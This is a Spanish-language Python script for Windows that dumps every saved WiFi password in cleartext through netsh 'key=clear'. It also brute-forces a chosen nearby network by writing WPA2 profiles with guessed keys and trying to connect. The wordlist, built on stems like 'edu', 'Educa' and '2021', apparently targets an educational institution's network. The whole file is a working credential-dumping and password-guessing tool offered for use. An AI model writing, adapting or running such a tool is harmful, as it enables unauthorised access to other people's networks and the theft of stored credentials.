import subprocess
import re
import os
import time
import socket
import random
import string
import sys

# ------------------ REDES GUARDADAS ------------------

def obtener_redes_guardadas():
    """Obtiene los nombres de las redes WiFi guardadas en la PC"""
    comando = "netsh wlan show profile"
    try:
        resultado = subprocess.run(comando, shell=True, capture_output=True, text=True, encoding='latin1', check=True)
    except subprocess.CalledProcessError:
        print("❌ Error al ejecutar el comando.")
        return []

    redes = []
    for linea in resultado.stdout.split("\n"):
        if "Perfil de todos los usuarios" in linea or "All User Profile" in linea:
            red = linea.split(":")[1].strip()
            redes.append(red)

    return redes

def obtener_contraseña_wifi(red):
    """Obtiene la contraseña de una red almacenada en la PC"""
    comando = f'netsh wlan show profile name="{red}" key=clear'
    try:
        resultado = subprocess.run(comando, shell=True, capture_output=True, text=True, encoding='latin1', check=True)
    except subprocess.CalledProcessError:
        print(f"❌ Error al obtener la contraseña de {red}.")
        return "No se encontró la contraseña"

    for linea in resultado.stdout.split("\n"):
        if "Contenido de la clave" in linea or "Key Content" in linea:
            return linea.split(":")[1].strip()
    
    return "No se encontró la contraseña"

def obtener_ip_actual():
    """Obtiene la IP de la red actual"""
    hostname = socket.gethostname()
    ip_local = socket.gethostbyname(hostname)
    return ip_local

# ------------------ REDES DISPONIBLES ------------------

def listar_redes():
    print("\n📡 Listando redes disponibles...\n")
    resultado = subprocess.run(["netsh", "wlan", "show", "networks", "mode=bssid"],
                               capture_output=True, text=True, encoding='latin1')

    if not resultado.stdout:
        print("❌ No se pudo leer la salida del comando.")
        return []

    redes = re.findall(r"SSID \d+ : (.+)", resultado.stdout)
    
    if not redes:
        print("❌ No se encontraron redes disponibles.")
        return []

    redes_limpias = []
    for i, red in enumerate(redes, 1):
        nombre = red.strip()
        if nombre not in redes_limpias:  # Evitar duplicados
            redes_limpias.append(nombre)
            print(f"{i}. {nombre}")
    
    return redes_limpias

def limpiar_consola():
    """Limpia la consola dependiendo del sistema operativo"""
    sistema = sys.platform
    if sistema == "win32":
        os.system('cls')  # Windows
    else:
        os.system('clear')  # Unix/Linux

# ------------------ Generar contraseña con patrones ------------------

def generar_contraseña_secuencial(longitud=8):
    """Genera una contraseña secuencial según el patrón especificado"""
 
    # Primeros caracteres posibles
    caracteres_numericos = [str(i) for i in range(10)]  # Números del 0 al 9
    caracteres_letras_minusculas = list(string.ascii_lowercase)  # Letras minúsculas
    caracteres_letras_mayusculas = list(string.ascii_uppercase)  # Letras mayúsculas
    caracteres_especiales = ['@', '.', ',', ';']  # Caracteres especiales
    
    # Crear un patrón de contraseñas
    contraseñas = []
    
    # Comienza con números y luego agrega letras y caracteres especiales
    contraseñas.extend(caracteres_numericos)  # Comienza con los números
    contraseñas.extend(caracteres_letras_minusculas)  # Agregar letras minúsculas
    contraseñas.extend(caracteres_letras_mayusculas)  # Agregar letras mayúsculas
    contraseñas.extend(caracteres_especiales)  # Agregar caracteres especiales
    
    # Empezamos con contraseñas simples y luego las vamos incrementando
    base_palabras = ["edu", "Edu", "Educa", "Educar", "123", "2021", "com", "code"]
    
    # Genera contraseñas de longitud incremental
    longitud_inicial = 3  # Comienza con una longitud de 3 y va incrementando
    while True:
        for palabra in base_palabras:
            for i in range(longitud_inicial):
                # Genera contraseñas combinando las palabras base con números y caracteres especiales
                contraseñas_posibles = [
                    f"{palabra}{i}",
                    f"{palabra}{i}@",
                    f"{palabra}{i}.",
                    f"{palabra}{i},",
                    f"{palabra}{i};",
                    f"{palabra}{i}{random.choice(caracteres_especiales)}"
                ]
                contraseñas.extend(contraseñas_posibles)

        longitud_inicial += 1  # Aumenta la longitud para la siguiente iteración
        yield contraseñas  # Genera las contraseñas progresivamente

def generar_contraseña_y_mostrar(redes, ssid):
    """Genera y muestra la contraseña actual y la siguiente en la secuencia"""
    generador_contrasena = generar_contraseña_secuencial()
    while True:
        contraseñas = next(generador_contrasena)
        for i, password in enumerate(contraseñas):
            # Limpiamos la consola para optimizar la visualización
            limpiar_consola()
            print(f"🔑 Intentando contraseña: {password}")
            if i + 1 < len(contraseñas):  # Mostrar la siguiente contraseña
                print(f"🔄 Siguiente contraseña: {contraseñas[i + 1]}")
            else:
                print("🔄 No hay más contraseñas para mostrar")
            
            # Intentamos conectar con la contraseña generada
            if conectar_wifi(ssid, password):
                print(f"✅ Conexión exitosa con la contraseña: {password}")
                return

            # Esperamos un segundo para que no se sature la consola
            time.sleep(1)

    # ------------------ Elegir red ------------------

def elegir_red(redes):
    """Permite al usuario elegir una red WiFi de la lista"""
    while True:
        opcion = input(f"\nElige una red (1-{len(redes)} o '.' para volver a listar): ")
        if opcion == ".":
            return None
        if opcion.isdigit():
            opcion = int(opcion)
            if 1 <= opcion <= len(redes):
                return redes[opcion - 1].strip()
        print("❌ Opción inválida, intenta nuevamente.")

def conectar_wifi(ssid, password):
    """Conecta a una red WiFi usando la contraseña proporcionada"""
    xml_template = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <keyMaterial>{password}</keyMaterial>
            </authEncryption>
        </security>
    </MSM>
</WLANProfile>
"""

    with open("temp_profile.xml", "w", encoding="utf-8") as f:
        f.write(xml_template)

    subprocess.run(["netsh", "wlan", "add", "profile", "filename=temp_profile.xml"], stdout=subprocess.DEVNULL)
    print(f"🔌 Intentando conectar a {ssid}...")

    subprocess.run(["netsh", "wlan", "connect", f"name={ssid}"], stdout=subprocess.DEVNULL)

    time.sleep(5)

    resultado = subprocess.run(["netsh", "wlan", "show", "interfaces"],
                               capture_output=True, text=True, encoding="latin1")
    if "State" in resultado.stdout and ("connected" in resultado.stdout.lower() or "conectado" in resultado.stdout.lower()):
        print(f"✅ Conectado exitosamente a {ssid}.")
        os.remove("temp_profile.xml")
        return True
    else:
        print(f"❌ No se pudo conectar a {ssid}.")
        os.remove("temp_profile.xml")
        return False

# ------------------ MENÚ PRINCIPAL ------------------

def main():
    while True:
        print("\n=== Menú Principal ===")
        print("1. Mostrar redes guardadas y contraseñas")
        print("2. Buscar y conectarse a redes disponibles")
        print("3. Mostrar IP local")
        print("0. Salir")

        opcion = input("\nElige una opción: ")

        if opcion == "1":
            redes = obtener_redes_guardadas()
            if redes:
                print("\n🔒 Redes WiFi guardadas:")
                for red in redes:
                    contraseña = obtener_contraseña_wifi(red)
                    print(f"Red: {red} | Contraseña: {contraseña}")
            else:
                print("❌ No se encontraron redes guardadas.")
        
        elif opcion == "2":
            while True:
                redes = listar_redes()
                if not redes:
                    continue  # Repetir si no se encontraron redes

                ssid = elegir_red(redes)
                if not ssid:
                    continue

                print("\nElige una opción para la contraseña:")
                print("1. Generar contraseña secuencial")
                print("2. Ingresar la contraseña manualmente")
                opcion_contraseña = input("Elige una opción (1/2): ")

                if opcion_contraseña == "1":
                    generar_contraseña_y_mostrar(redes, ssid)
                    break
                elif opcion_contraseña == "2":
                    password = input(f"Introduce la contraseña de {ssid}: ")
                    while not conectar_wifi(ssid, password):
                        print("❌ Intentando con una nueva contraseña...")
                        password = input(f"Introduce la contraseña de {ssid}: ")
                    break
                else:
                    print("❌ Opción inválida. Intentando nuevamente...")

        elif opcion == "3":
            print("\n IP local:", obtener_ip_actual())
        
        elif opcion == "0":
            print("👋 Saliendo del programa.")
            break
        
        else:
            print("❌ Opción inválida, intenta nuevamente.")

if __name__ == "__main__":
    main()
